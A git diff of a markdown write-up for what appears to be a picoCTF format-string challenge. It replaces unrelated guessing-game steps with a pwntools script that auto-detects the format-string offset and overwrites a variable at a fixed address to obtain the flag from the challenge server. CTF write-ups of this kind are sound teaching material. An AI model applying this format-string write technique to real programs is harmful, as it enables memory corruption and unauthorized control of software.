@@ -12,16 +12,39 @@ Download the source [here](../format-string-2.c).
 
 ## Solution
 
-1. Unzip folder.
-2. Move to drop-in directory.<br>
-   `cd drop-in/`
-3. Check the file extension.<br>
-   `file guessing_game.sh`
-4. Execute the file.<br>
-   `./guessing_game.sh`
-5. Input numbers.<br>
-> [!TIP]
-> Input the middle number *(range number / 2 = middle number)*
+1. Connect with the challenge instance.
+2. Review the c source code given to investigate.
+3. We'll then found out that the input read is printed as hex values.
 
+   ![image](https://github.com/user-attachments/assets/fbda7617-3b95-471c-afe9-241b8b6592d8)
+   **`scanf` will take the input until it encounters any newline, tab or space. Meaning that payloads could be inputted as well. To find the flag, we need to change the value of sus.*
+   
+4. To overwrite the value of sus, we'll need to find the address of it and export it as a file named "objdump.txt".<br>
+   `objdump -D vuln > objdump.txt`
+5. Then, write a python script with pwntools to automatically find the offset and overwrite it.
+
+   ```python
+   from pwn import *
+
+   context.log_level = "critical"
+   context.binary = ELF('./vuln')
+   
+   p = remote('rhea.picoctf.net', 57163)
+   
+   def exec_fmt(payload):
+       p = remote('rhea.picoctf.net', 57163)
+       p.sendline(payload)
+       return p.recvall()
+   
+   autofmt = FmtStr(exec_fmt)
+   offset = autofmt.offset
+   
+   payload = fmtstr_payload(offset, {0x404060: 0x67616c66})
+   
+   p.sendline(payload)
+   
+   flag = p.recvall()
+   
+   print("Flag: ", flag)
+   ```
 6. Get the flag.
-
